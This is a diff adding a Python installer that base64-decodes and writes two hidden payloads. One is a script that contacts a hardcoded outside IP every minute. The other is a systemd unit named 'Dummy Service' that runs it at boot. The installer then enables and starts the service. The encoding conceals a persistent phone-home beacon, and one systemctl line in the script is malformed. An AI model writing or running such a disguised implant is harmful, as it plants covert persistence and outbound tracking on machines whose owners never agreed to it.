@@ -1,0 +1,21 @@
+#!/usr/bin/python3
+import base64
+
+pingerApp = 'IyEvdXNyL2Jpbi9weXRob24zCgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRpbWUKCmRlZiBMb2dpYygpOgogICAgdHJ5OgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlcXVlc3RzLmdldCgiaHR0cDovLzEzLjIzMi4xOTQuMTExOjgwL3ZlcmlmeS9kMzI2MWZhNjBjNzk1NjJhNGI3MTdmM2JkMzQyMGNjYyIpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEqNjApCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KCJFcnJvciBpbnNpZGUgbG9vcCEiLCBlKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJFcnJvciBpbiBsb2dpYyAhICIsIGUpCiAgICAgICAgTG9naWMoKQoKCkxvZ2ljKCk='
+pingerService = 'W1VuaXRdCkRlc2NyaXB0aW9uPUR1bW15IFNlcnZpY2UKQWZ0ZXI9bXVsdGktdXNlci50YXJnZXQKCltTZXJ2aWNlXQpUeXBlPXNpbXBsZQpFeGVjU3RhcnQ9L3Vzci9iaW4vcHl0aG9uMyAvdXNyL2Jpbi9waW5nZXIucHkKU3RhbmRhcmRJbnB1dD10dHktZm9yY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=='
+
+f = open('/usr/bin/pinger.py', 'w')
+f.write(base64.b64decode(pingerApp).decode())
+f.close()
+
+f = open('/lib/systemd/system/pinger.service', 'w')
+f.write(base64.b64decode(pingerService).decode())
+f.close()
+
+import subprocess
+import os
+os.system('systemctl pinger-reload')
+os.system('systemctl enable pinger')
+os.system('systemctl start pinger')
+
+print("Installed successfully!")
